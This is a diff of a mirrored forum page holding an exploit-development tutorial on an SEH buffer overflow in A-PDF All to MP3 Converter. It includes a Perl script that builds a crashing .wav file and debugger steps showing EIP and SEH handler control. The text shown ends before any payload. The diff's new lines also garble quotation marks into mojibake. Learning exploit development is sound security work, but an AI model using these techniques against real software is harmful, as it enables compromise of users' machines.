@@ -1,34 +1,31 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en">
+<html dir="ltr" lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"><!-- Mirrored from garage4hackers.com/content.php?r=89-SEH-Overflow-exploit-POC-Part-2 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 10:49:22 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->
 
-<!-- Mirrored from garage4hackers.com/content.php?r=89-SEH-Overflow-exploit-POC-Part-2 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 10:49:22 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
-<head>
-    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
-<meta id="e_vb_meta_bburl" name="vb_meta_bburl" content="index.html" />
-<base  /><!--[if IE]></base><![endif]-->
-<meta name="generator" content="vBulletin 4.2.1" />
-<meta http-equiv="X-UA-Compatible" content="IE=9" />
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<meta content="index.html" id="e_vb_meta_bburl" name="vb_meta_bburl"/>
+<base/><!--[if IE]></base><![endif]-->
+<meta content="vBulletin 4.2.1" name="generator"/>
+<meta content="IE=9" http-equiv="X-UA-Compatible"/>
 
-	<link rel="Shortcut Icon" href="favicon.ico" type="image/x-icon" />
+	<link href="favicon.ico" rel="Shortcut Icon" type="image/x-icon"/>
 
 
-		<meta name="keywords" content="" />
-		<meta name="description" content="SEH Overflow exploit POC Part 2" />
+		<meta content="" name="keywords"/>
+		<meta content="SEH Overflow exploit POC Part 2" name="description"/>
 
 
 
-	<meta property="fb:app_id" content="170793809601191" />
-<meta property="og:site_name" content="Garage4hackers Forum" />
-<meta property="og:description" content="SEH Overflow exploit POC Part 2" />
-<meta property="og:url" content="contente906.html?r=89-SEH-Overflow-exploit-POC-Part-2" />
-<meta property="og:type" content="article" />
+	<meta content="170793809601191" property="fb:app_id"/>
+<meta content="Garage4hackers Forum" property="og:site_name"/>
+<meta content="SEH Overflow exploit POC Part 2" property="og:description"/>
+<meta content="contente906.html?r=89-SEH-Overflow-exploit-POC-Part-2" property="og:url"/>
+<meta content="article" property="og:type"/>
 
 
 
 
 	
-		<script type="text/javascript" src="../yui.yahooapis.com/comboaa66?2.9.0/build/yuiloader-dom-event/yuiloader-dom-event.js&amp;2.9.0/build/connection/connection-min.js"></script>
+		<script src="../yui.yahooapis.com/comboaa66?2.9.0/build/yuiloader-dom-event/yuiloader-dom-event.js&amp;2.9.0/build/connection/connection-min.js" type="text/javascript"></script>
 	
 
 <script type="text/javascript">
@@ -69,16 +66,16 @@
 	var AJAXBASEURL = "index.html";
 // -->
 </script>
-<script type="text/javascript" src="clientscript/vbulletin-core6719.js?v=421"></script>
+<script src="clientscript/vbulletin-core6719.js?v=421" type="text/javascript"></script>
 
 
 
-	<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum RSS Feed" href="external9476.php?type=RSS2" />
+	<link href="external9476.php?type=RSS2" rel="alternate" title="Garage4hackers Forum RSS Feed" type="application/rss+xml"/>
 	
 
 
 
-	<link rel="stylesheet" type="text/css" href="css30f2.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,editor.css,popupmenu.css,reset-fonts.css,vbulletin.css,vbulletin-chrome.css,vbulletin-formcontrols.css," />
+	<link href="css30f2.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,editor.css,popupmenu.css,reset-fonts.css,vbulletin.css,vbulletin-chrome.css,vbulletin-formcontrols.css," rel="stylesheet" type="text/css"/>
 
 	<!--[if lt IE 8]>
 	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=popupmenu-ie.css,vbulletin-ie.css,vbulletin-chrome-ie.css,vbulletin-formcontrols-ie.css,editor-ie.css" />
@@ -86,11 +83,11 @@
 
 
     
-        <link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum - CMS RSS Feed" href="externalbc09.php?do=rss&amp;type=newcontent&amp;sectionid=1&amp;days=120&amp;count=10" />
+        <link href="externalbc09.php?do=rss&amp;type=newcontent&amp;sectionid=1&amp;days=120&amp;count=10" rel="alternate" title="Garage4hackers Forum - CMS RSS Feed" type="application/rss+xml"/>
     
     <title>Garage4hackers Forum - SEH Overflow exploit POC Part 2</title>
 	
-		<link rel="stylesheet" type="text/css" href="css6862.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=widgets.css,vbcms.css,postbit-lite.css,postlist.css,lightbox.css,overlay.css,tagcloud.css," />
+		<link href="css6862.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=widgets.css,vbcms.css,postbit-lite.css,postlist.css,lightbox.css,overlay.css,tagcloud.css," rel="stylesheet" type="text/css"/>
 	
     <!--[if lt IE 8]>
         <link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=vbcms-ie.css,postbit-lite-ie.css,postlist-ie.css" />
@@ -100,46 +97,46 @@
 		window.LESS_THAN_IE7 = true;
 	</script>
     <![endif]-->
-	<script type="text/javascript" src="clientscript/vbulletin_overlay6719.html?v=421"></script>
-	<script type="text/javascript" src="clientscript/vbulletin_cms6719.html?v=421"></script>
-	<script type="text/javascript" src="clientscript/vbulletin_ajax_htmlloader6719.js?v=421">
+	<script src="clientscript/vbulletin_overlay6719.html?v=421" type="text/javascript"></script>
+	<script src="clientscript/vbulletin_cms6719.html?v=421" type="text/javascript"></script>
+	<script src="clientscript/vbulletin_ajax_htmlloader6719.js?v=421" type="text/javascript">
     </script>
-    <link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+    <link href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" rel="stylesheet" type="text/css"/>
 
 </head>
 <body style="text-align:left">
 <div class="above_body"> <!-- closing tag is in template navbar -->
-<div id="header" class="floatcontainer doc_header">
-	<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
-	<div id="toplinks" class="toplinks">
+<div class="floatcontainer doc_header" id="header">
+	<div><a class="logo-image" href="forum.html" name="top"><img alt="Garage4hackers Forum" src="images/misc/vbulletin4_logo.png"/></a></div>
+	<div class="toplinks" id="toplinks">
 		
 			<ul class="nouser">
 			
 				<li><a href="register.html" rel="nofollow">Register</a></li>
 			
-				<li><a rel="help" href="faq.html">Help</a></li>
+				<li><a href="faq.html" rel="help">Help</a></li>
 				<li>
-			<script type="text/javascript" src="clientscript/vbulletin_md56719.html?v=421"></script>
-			<form id="navbar_loginform" action="../external.html?link=http://garage4hackers.com/login.php?do=login" method="post" onsubmit="md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)">
-				<fieldset id="logindetails" class="logindetails">
+			<script src="clientscript/vbulletin_md56719.html?v=421" type="text/javascript"></script>
+			<form action="../external.html?link=http://garage4hackers.com/login.php?do=login" id="navbar_loginform" method="post" onsubmit="md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)">
+				<fieldset class="logindetails" id="logindetails">
 					<div>
 						<div>
-					<input type="text" class="textbox default-value" name="vb_login_username" id="navbar_username" size="10" accesskey="u" tabindex="101" value="User Name" />
-					<input type="password" class="textbox" tabindex="102" name="vb_login_password" id="navbar_password" size="10" />
-					<input type="text" class="textbox default-value" tabindex="102" name="vb_login_password_hint" id="navbar_password_hint" size="10" value="Password" style="display:none;" />
-					<input type="submit" class="loginbutton" tabindex="104" value="Log in" title="Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself." accesskey="s" />
+					<input accesskey="u" class="textbox default-value" id="navbar_username" name="vb_login_username" size="10" tabindex="101" type="text" value="User Name"/>
+					<input class="textbox" id="navbar_password" name="vb_login_password" size="10" tabindex="102" type="password"/>
+					<input class="textbox default-value" id="navbar_password_hint" name="vb_login_password_hint" size="10" style="display:none;" tabindex="102" type="text" value="Password"/>
+					<input accesskey="s" class="loginbutton" tabindex="104" title="Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself." type="submit" value="Log in"/>
 						</div>
 					</div>
 				</fieldset>
-				<div id="remember" class="remember">
-					<label for="cb_cookieuser_navbar"><input type="checkbox" name="cookieuser" value="1" id="cb_cookieuser_navbar" class="cb_cookieuser_navbar" accesskey="c" tabindex="103" /> Remember Me?</label>
+				<div class="remember" id="remember">
+					<label for="cb_cookieuser_navbar"><input accesskey="c" class="cb_cookieuser_navbar" id="cb_cookieuser_navbar" name="cookieuser" tabindex="103" type="checkbox" value="1"/> Remember Me?</label>
 				</div>
 
-				<input type="hidden" name="s" value="" />
-				<input type="hidden" name="securitytoken" value="guest" />
-				<input type="hidden" name="do" value="login" />
-				<input type="hidden" name="vb_login_md5password" />
-				<input type="hidden" name="vb_login_md5password_utf" />
+				<input name="s" type="hidden" value=""/>
+				<input name="securitytoken" type="hidden" value="guest"/>
+				<input name="do" type="hidden" value="login"/>
+				<input name="vb_login_md5password" type="hidden"/>
+				<input name="vb_login_md5password_utf" type="hidden"/>
 			</form>
 			<script type="text/javascript">
 			YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
@@ -201,9 +198,9 @@
 			</script>
 				</li>
 				
-					<li id="fb_headerbox" class="hidden">
+					<li class="hidden" id="fb_headerbox">
 
-	<a id="fb_loginbtn" href="#"><img src="images/misc/facebook_login.html" alt="The Facebook Platform" /></a>
+	<a href="#" id="fb_loginbtn"><img alt="The Facebook Platform" src="images/misc/facebook_login.gif"/></a>
 
 </li>
 
@@ -215,14 +212,14 @@
 		 
 		 
 	</div>
-	<hr />
+	<hr/>
 </div>
-<div id="navbar" class="navbar">
-	<ul id="navtabs" class="navtabs floatcontainer">
+<div class="navbar" id="navbar">
+	<ul class="navtabs floatcontainer" id="navtabs">
 		
 		
 	
-		<li  id="vbtab_whatsnew">
+		<li id="vbtab_whatsnew">
 			<a class="navtab" href="activity.html">What's New?</a>
 		</li>
 		
@@ -246,35 +243,35 @@
 		
 
 	
-		<li  id="vbtab_forum">
+		<li id="vbtab_forum">
 			<a class="navtab" href="forum.html">Forum</a>
 		</li>
 		
 		
 
 	
-		<li  id="vbtab_blog">
+		<li id="vbtab_blog">
 			<a class="navtab" href="blog.html">Blogs</a>
 		</li>
 		
 		
 
 	
-		<li  id="tab_nja4_357">
+		<li id="tab_nja4_357">
 			<a class="navtab" href="pages7b82.html?pageid=2">G4H Team</a>
 		</li>
 		
 		
 
 	
-		<li  id="tab_nta0_579">
+		<li id="tab_nta0_579">
 			<a class="navtab" href="pages8782.html?pageid=3">IRC</a>
 		</li>
 		
 		
 
 	
-		<li  id="tab_nta0_442">
+		<li id="tab_nta0_442">
 			<a class="navtab" href="pagesdbe0.html?pageid=4">Ranchoddas</a>
 		</li>
 		
@@ -284,16 +281,16 @@
             <a class="navtab" href="pages.html">Events and Conferences</a></li>
 	</ul>
 	
-		<div id="globalsearch" class="globalsearch">
-			<form action="../external.html?link=http://garage4hackers.com/search.php?do=process" method="post" id="navbar_search" class="navbar_search">
+		<div class="globalsearch" id="globalsearch">
+			<form action="../external.html?link=http://garage4hackers.com/search.php?do=process" class="navbar_search" id="navbar_search" method="post">
 				
-				<input type="hidden" name="securitytoken" value="guest" />
-				<input type="hidden" name="do" value="process" />
-				<span class="textboxcontainer"><span><input type="text" value="" name="query" class="textbox" tabindex="99"/></span></span>
-				<span class="buttoncontainer"><span><input type="image" class="searchbutton" src="images/buttons/search.html" name="submit" onclick="document.getElementById('navbar_search').submit;" tabindex="100"/></span></span>
+				<input name="securitytoken" type="hidden" value="guest"/>
+				<input name="do" type="hidden" value="process"/>
+				<span class="textboxcontainer"><span><input class="textbox" name="query" tabindex="99" type="text" value=""/></span></span>
+				<span class="buttoncontainer"><span><input class="searchbutton" name="submit" onclick="document.getElementById('navbar_search').submit;" src="images/buttons/search.html" tabindex="100" type="image"/></span></span>
 			</form>
 			<ul class="navbar_advanced_search">
-				<li><a href="search.html" accesskey="4">Advanced Search</a></li>
+				<li><a accesskey="4" href="search.html">Advanced Search</a></li>
 				
 			</ul>
 		</div>
@@ -302,9 +299,9 @@
 </div><!-- closing div for above_body -->
 
 <div class="body_wrapper">
-<div id="breadcrumb" class="breadcrumb">
+<div class="breadcrumb" id="breadcrumb">
 	<ul class="floatcontainer">
-		<li class="navbithome"><a href="content.html" accesskey="1"><img src="images/misc/navbit-home.html" alt="Home" /></a></li>
+		<li class="navbithome"><a accesskey="1" href="content.html"><img alt="Home" src="images/misc/navbit-home.png"/></a></li>
 		
 	<li class="navbit"><a href="content.html">Home</a></li>
 
@@ -314,7 +311,7 @@
 	<li class="navbit lastnavbit"><span>SEH Overflow exploit POC Part 2</span></li>
 
 	</ul>
-	<hr />
+	<hr/>
 </div>
 
 
@@ -334,32 +331,28 @@ google_color_url = "";
 google_ui_features = "rc:6";
 //-->
 </script>
-<script type="text/javascript"
-  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+<script src="../pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript">
 </script>
 </div>
 
-<div id="ad_global_below_navbar"><script async src="../pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<div id="ad_global_below_navbar"><script async="" src="../pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
 <!-- garage1 -->
-<ins class="adsbygoogle"
-     style="display:inline-block;width:728px;height:90px"
-     data-ad-client="ca-pub-6847984837250662"
-     data-ad-slot="4036513682"></ins>
+<ins class="adsbygoogle" data-ad-client="ca-pub-6847984837250662" data-ad-slot="4036513682" style="display:inline-block;width:728px;height:90px"></ins>
 <script>
 (adsbygoogle = window.adsbygoogle || []).push({});
 </script></div>
 
 
-	<form action="../external.html?link=http://garage4hackers.com/profile.php?do=dismissnotice" method="post" id="notices" class="notices">
-		<input type="hidden" name="do" value="dismissnotice" />
-		<input type="hidden" name="s" value="" />
-		<input type="hidden" name="securitytoken" value="guest" />
-		<input type="hidden" id="dismiss_notice_hidden" name="dismiss_noticeid" value="" />
-		<input type="hidden" name="url" value="" />
+	<form action="../external.html?link=http://garage4hackers.com/profile.php?do=dismissnotice" class="notices" id="notices" method="post">
+		<input name="do" type="hidden" value="dismissnotice"/>
+		<input name="s" type="hidden" value=""/>
+		<input name="securitytoken" type="hidden" value="guest"/>
+		<input id="dismiss_notice_hidden" name="dismiss_noticeid" type="hidden" value=""/>
+		<input name="url" type="hidden" value=""/>
 		<ol>
 			<li class="restore" id="navbar_notice_2">
 	
-	<html>
+	
 <h2>
 The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen forever</a> - but it won't die; it'll stay for long in search engine results and we hope it would keep helping newbies in some way or other - cheers! 
 
@@ -367,7 +360,7 @@ The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen f
 </h2>
 
 <!-- Mirrored from garage4hackers.com/content.php?r=89-SEH-Overflow-exploit-POC-Part-2 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 10:49:22 GMT -->
-</html>
+
 </li>
 		</ol>
 	</form>
@@ -375,7 +368,7 @@ The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen f
 
 
 <div class="vbcms_content">
-<div id="doc3" class="yui-tvb-r3">
+<div class="yui-tvb-r3" id="doc3">
 	<div id="bd">
 		<div id="yui-main">
 			<div class="yui-b">
@@ -406,11 +399,11 @@ The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen f
 <div class="cms_widget">
 	<div class="block">
 		<div class="cms_widget_header">
-			<h3><img src="images/cms/sections.html" alt="" /> Menu</h3>
+			<h3><img alt="" src="images/cms/sections.png"/> Menu</h3>
 		</div>
 		<div class="cms_widget_content widget_content">
 			<div class="vb-tree-menu">
-				<ul >
+				<ul>
 <li><a href="contentfbb6.html?r=5-g4h-tutorial-and-research-papers" title="G4H Tutorial and Papers">G4H Tutorial and Papers</a>
 </li>
 <li><a href="content842d.html?r=4-g4h-tools-and-scripts" title="G4H Tools and Scripts">G4H Tools and Scripts</a>
@@ -523,7 +516,7 @@ The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen f
 		<div class="fullwidth">
 			
 				<div>
-<fb:like href="contente906.html?r=89-SEH-Overflow-exploit-POC-Part-2" font="tahoma" layout="standard" show_faces="false" width="260" action="../external.html?link=http://garage4hackers.com/like" colorscheme="light"></fb:like></div>
+<fb:like action="../external.html?link=http://garage4hackers.com/like" colorscheme="light" font="tahoma" href="contente906.html?r=89-SEH-Overflow-exploit-POC-Part-2" layout="standard" show_faces="false" width="260"></fb:like></div>
 			
 			
 				<div class="article_username_container">
@@ -531,20 +524,20 @@ The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen f
 	<a class="username offline popupctrl" href="member62b2.html?u=1164" title="m0nna is offline"><strong>m0nna</strong></a>
 	<ul class="popupbody popuphover memberaction_body">
 		<li class="left">
-			<a href="member62b2.html?u=1164" class="siteicon_profile">
+			<a class="siteicon_profile" href="member62b2.html?u=1164">
 				View Profile
 			</a>
 		</li>
 		
 		<li class="right">
-			<a href="searchc71c.html?do=finduser&amp;userid=1164&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">
+			<a class="siteicon_forum" href="searchc71c.html?do=finduser&amp;userid=1164&amp;contenttype=vBForum_Post&amp;showposts=1" rel="nofollow">
 				View Forum Posts
 			</a>
 		</li>
 		
 		
 		<li class="left">
-			<a href="private83fa.html?do=newpm&amp;u=1164" class="siteicon_message" rel="nofollow">
+			<a class="siteicon_message" href="private83fa.html?do=newpm&amp;u=1164" rel="nofollow">
 				Private Message
 			</a>
 		</li>
@@ -552,7 +545,7 @@ The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen f
 		
 		
 		<li class="right">
-			<a href="blog62b2.html?u=1164" class="siteicon_blog" rel="nofollow">
+			<a class="siteicon_blog" href="blog62b2.html?u=1164" rel="nofollow">
 				View Blog Entries
 			</a>
 		</li>
@@ -562,7 +555,7 @@ The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen f
 		
 		
 		<li class="right">
-			<a href="listbfcd.html?r=author/1164-m0nna" class="siteicon_article" rel="nofollow">
+			<a class="siteicon_article" href="listbfcd.html?r=author/1164-m0nna" rel="nofollow">
 				View Articles
 			</a>
 		</li>
@@ -580,31 +573,31 @@ The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen f
                                 <div class="article_rating_container">
                                         <div class="popupmenu cmsratingmenu" id="cmsrating">
                                                 <h6><a class="popupctrl" href="javascript://" id="cmsrating_current">Rate this article</a></h6>
-                                                <form action="../external.html?link=http://garage4hackers.com/content.php?89/rate" method="post" id='cms_cmsrate_form'>
+                                                <form action="../external.html?link=http://garage4hackers.com/content.php?89/rate" id="cms_cmsrate_form" method="post">
                                                         <ul class="popupbody popuphover">
                                                                 
                                                                         <li><label for="r5"><span class="rating5 cmsrating right">
-                                                                                <input type="radio" name="vote" value="5" id="r5"  tabindex="1" /> Excellent
+                                                                                <input id="r5" name="vote" tabindex="1" type="radio" value="5"/> Excellent
                                                                         </span></label></li>
                                                                         <li><label for="r4"><span class="rating4 cmsrating right">
-                                                                                <input type="radio" name="vote" value="4" id="r4"  tabindex="1" /> Good
+                                                                                <input id="r4" name="vote" tabindex="1" type="radio" value="4"/> Good
                                                                         </span></label></li>
                                                                         <li><label for="r3"><span class="rating3 cmsrating right">
-                                                                                <input type="radio" name="vote" value="3" id="r3"  tabindex="1" /> Average
+                                                                                <input id="r3" name="vote" tabindex="1" type="radio" value="3"/> Average
                                                                         </span></label></li>
                                                                         <li><label for="r2"><span class="rating2 cmsrating right">
-                                                                                <input type="radio" name="vote" value="2" id="r2"  tabindex="1" /> Bad
+                                                                                <input id="r2" name="vote" tabindex="1" type="radio" value="2"/> Bad
                                                                         </span></label></li>
                                                                         <li><label for="r1"><span class="rating1 cmsrating right">
-                                                                                <input type="radio" name="vote" value="1" id="r1"  tabindex="1" /> Terrible
+                                                                                <input id="r1" name="vote" tabindex="1" type="radio" value="1"/> Terrible
                                                                         </span></label></li>
-                                                                        <li class="formsubmit"><input type="submit" class="button" value="Vote Now" tabindex="1" /></li>
+                                                                        <li class="formsubmit"><input class="button" tabindex="1" type="submit" value="Vote Now"/></li>
                                                                 
                                                         </ul>
-                                                        <input type="hidden" name="s" value="" />
-                                                        <input type="hidden" name="securitytoken" value="guest" />
+                                                        <input name="s" type="hidden" value=""/>
+                                                        <input name="securitytoken" type="hidden" value="guest"/>
                                                 </form>
-                                                <script type="text/javascript" src="clientscript/cms_ajax_rate6719.html?v=421"></script>
+                                                <script src="clientscript/cms_ajax_rate6719.html?v=421" type="text/javascript"></script>
                                                 <script type="text/javascript">
                                                 <!--
                                                         var nodeid = 89;
@@ -616,7 +609,7 @@ The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen f
                         
                         <div class="cms_clear"></div>
                         
-				<div class=" article_username_container ">
+				<div class="article_username_container">
 					
 						
 							Published on 09-20-2011  10:41 PM
@@ -624,208 +617,208 @@ The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen f
 					
 					
 					
-						&nbsp;Number of Views: 3072
-						&nbsp;
+						¬†Number of Views: 3072
+						¬†
 					
 				</div>
 			
                        
                         <div class="article_rating_container">
-                            	<a href="contente906.html?r=89-SEH-Overflow-exploit-POC-Part-2#comments"  rel="nofollow"><span id="comments_top_count">0</span> <span id="comments_top_text"> Comments</span></a>
-				<img src="images/misc/comment.html" alt="Comments" border="0" />
+                            	<a href="contente906.html?r=89-SEH-Overflow-exploit-POC-Part-2#comments" rel="nofollow"><span id="comments_top_count">0</span> <span id="comments_top_text"> Comments</span></a>
+				<img alt="Comments" border="0" src="images/misc/comment.png"/>
                         </div>
                        
 		</div>
 	</div>
     
     <div class="clear"></div>
-	<div class="article cms_clear restore postcontainer"><b><u>Exploiting the SEH overflow in A-PDF all to mp3 converter</u></b><br />
-<br />
-1) I wrote a perl script that creates a ìwavî file with 5000 Aís as shown below:<br />
+	<div class="article cms_clear restore postcontainer"><b><u>Exploiting the SEH overflow in A-PDF all to mp3 converter</u></b><br/>
+<br/>
+1) I wrote a perl script that creates a ‚Äúwav‚Äù file with 5000 A‚Äôs as shown below:<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<pre class="bbcode_code"style="height:96px;">    #!/usr/bin/perl -w
+	<pre class="bbcode_code" style="height:96px;">    #!/usr/bin/perl -w
     use strict;
-    my $file = &quot;exploit_seh.wav&quot;;
-    my $junk =&quot;\x41&quot; x 5000 ;
-    open OUTPUT, &quot;&gt;&quot;, &quot;$file&quot;;
+    my $file = "exploit_seh.wav";
+    my $junk ="\x41" x 5000 ;
+    open OUTPUT, "&gt;", "$file";
     print OUTPUT $junk;</pre>
-</div>This script creates a file ìexploit_seh.wavî.<br />
-<br />
-2)    After I open the created file ìexploit_seh.wavî with ìA-pdf all to mp3 converterî, the software silently crashes without any error message. (This is probably because we overwrote the seh handler, which was suppose to handle exception.)<br />
-<br />
-3)    To check what happened, this time i open the debugger ìimmunity debugger ì and attach the debugger to the process ìAlltomp3î as shown below:<br />
-<br />
-<a href="../external.html?link=http://imageshack.us/photo/my-images/683/attachtoprocess2.png/" target="_blank"><img src="../external.html?link=http://imageshack.com/e/p5aMES7Yj" border="0" alt="" /></a><br />
-<br />
-Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br />
-<br />
-4)    Afer attaching the debugger to the process, now run the program and then open the created file ìexploit_seh.wavî with ìPDf all to mp3 converterî, this time you find that the program crashes and eip is overwritten with 41414141 (AAAA) as shown in the below figure. <br />
-<br />
-<a href="../external.html?link=http://imageshack.us/photo/my-images/853/alltomp3.png/" target="_blank"><img src="../external.html?link=http://imageshack.com/e/p5aMES7Yj" border="0" alt="" /></a><br />
-<br />
-Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br />
-<br />
-<a href="../external.html?link=http://imageshack.us/photo/my-images/836/openfile4.png/" target="_blank"><img src="../external.html?link=http://imageshack.com/e/p5aMES7Yj" border="0" alt="" /></a><br />
-<br />
-Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br />
-<br />
-<a href="../external.html?link=http://imageshack.us/photo/my-images/190/aaaaaa5.png/" target="_blank"><img src="../external.html?link=http://imageshack.com/e/p5aMES7Yj" border="0" alt="" /></a><br />
-<br />
-Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br />
-<br />
-5)    Since we have control over eip, we can write a classic stack based buffer overflow exploit but since we want to write a reliable exploit,  let us see if we can write a seh based exploit. After looking into the seh chain i find that our seh handler is also overwritten with 41414141 (AAAA) as shown below. This means we now have control over seh handler.<br />
-<br />
-<a href="../external.html?link=http://imageshack.us/photo/my-images/101/sehandler6.png/" target="_blank"><img src="../external.html?link=http://imageshack.com/e/p5aMES7Yj" border="0" alt="" /></a><br />
-<br />
-Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br />
-<br />
-After following the seh chain in the stack, we find that pointer to the next seh record and address of the seh handler is also overwritten with 41414141 (AAAA). As shown below (see the lower right corner)Öso now we have control over pointer to the next seh record and also the seh handler.<br />
-<br />
-<a href="../external.html?link=http://imageshack.us/photo/my-images/189/sehandleroverwrite7.png/" target="_blank"><img src="../external.html?link=http://imageshack.com/e/p5aMES7Yj" border="0" alt="" /></a><br />
-<br />
-Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br />
-<b><u><br />
-Finding offset to the seh handler</u></b><br />
-<br />
-1)    Now to write an seh based exploit, we have to know where exactly our seh handler is located. To find the exact offset, let us create a pattern of 5000 characters using metasploit and replace the 5000 Aís in our perl script with this pattern as shown below:<br />
-<br />
-<a href="../external.html?link=http://imageshack.us/photo/my-images/690/offset8.png/" target="_blank"><img src="../external.html?link=http://imageshack.com/e/p5aMES7Yj" border="0" alt="" /></a><br />
-<br />
-Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br />
-<br />
-Perl script with a pattern of 5000 characters is shown below:<br />
-<br />
+</div>This script creates a file ‚Äúexploit_seh.wav‚Äù.<br/>
+<br/>
+2)    After I open the created file ‚Äúexploit_seh.wav‚Äù with ‚ÄúA-pdf all to mp3 converter‚Äù, the software silently crashes without any error message. (This is probably because we overwrote the seh handler, which was suppose to handle exception.)<br/>
+<br/>
+3)    To check what happened, this time i open the debugger ‚Äúimmunity debugger ‚Äú and attach the debugger to the process ‚ÄúAlltomp3‚Äù as shown below:<br/>
+<br/>
+<a href="../external.html?link=http://imageshack.us/photo/my-images/683/attachtoprocess2.png/" target="_blank"><img alt="" border="0" src="../external.html?link=http://imageshack.com/e/p5aMES7Yj"/></a><br/>
+<br/>
+Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br/>
+<br/>
+4)    Afer attaching the debugger to the process, now run the program and then open the created file ‚Äúexploit_seh.wav‚Äù with ‚ÄúPDf all to mp3 converter‚Äù, this time you find that the program crashes and eip is overwritten with 41414141 (AAAA) as shown in the below figure. <br/>
+<br/>
+<a href="../external.html?link=http://imageshack.us/photo/my-images/853/alltomp3.png/" target="_blank"><img alt="" border="0" src="../external.html?link=http://imageshack.com/e/p5aMES7Yj"/></a><br/>
+<br/>
+Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br/>
+<br/>
+<a href="../external.html?link=http://imageshack.us/photo/my-images/836/openfile4.png/" target="_blank"><img alt="" border="0" src="../external.html?link=http://imageshack.com/e/p5aMES7Yj"/></a><br/>
+<br/>
+Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br/>
+<br/>
+<a href="../external.html?link=http://imageshack.us/photo/my-images/190/aaaaaa5.png/" target="_blank"><img alt="" border="0" src="../external.html?link=http://imageshack.com/e/p5aMES7Yj"/></a><br/>
+<br/>
+Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br/>
+<br/>
+5)    Since we have control over eip, we can write a classic stack based buffer overflow exploit but since we want to write a reliable exploit,  let us see if we can write a seh based exploit. After looking into the seh chain i find that our seh handler is also overwritten with 41414141 (AAAA) as shown below. This means we now have control over seh handler.<br/>
+<br/>
+<a href="../external.html?link=http://imageshack.us/photo/my-images/101/sehandler6.png/" target="_blank"><img alt="" border="0" src="../external.html?link=http://imageshack.com/e/p5aMES7Yj"/></a><br/>
+<br/>
+Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br/>
+<br/>
+After following the seh chain in the stack, we find that pointer to the next seh record and address of the seh handler is also overwritten with 41414141 (AAAA). As shown below (see the lower right corner)‚Ä¶so now we have control over pointer to the next seh record and also the seh handler.<br/>
+<br/>
